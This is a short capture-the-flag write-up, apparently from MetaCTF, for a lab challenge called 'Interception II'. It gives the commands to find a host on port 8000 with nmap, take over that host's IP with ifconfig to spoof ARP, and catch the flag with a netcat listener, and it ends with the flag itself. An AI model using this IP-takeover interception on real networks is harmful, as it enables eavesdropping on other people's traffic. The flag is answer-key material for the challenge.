# Interception II
Someone on this network is periodically sending the flag to ... someone else on this network, over TCP port 8000. Go get it.
ssh ctf-46ed3559da08@host.cg21.metaproblems.com -p 7000

## Solve
Similar process to Interception I.

1. There are more hosts up, so let's see what is open.

`nmap -p 8000 192.168.0.0/24 -v | grep open`

```
Discovered open port 8000/tcp on 192.168.0.78
8000/tcp open http-alt
```

2. Ping to test connection.

`ping 192.168.0.78`

3. Check interface that we gotta change

`arp -a`

```
ip-192-168-0-78.ec2.internal (192.168.0.78) at 02:42:0a:00:a3:c3 [ether] on eth0
```

4. Change the ip

`ifconfig eth0 192.168.0.78 netmask 255.255.255.0`

5. `ping 192.168.0.78` to refresh the arp cache so it does the spoofy

6. Setup the netcat connection

`nc -lvp 8000`

`MetaCTF{s0_m4ny_1ps_but_wh1ch_t0_ch00s3}`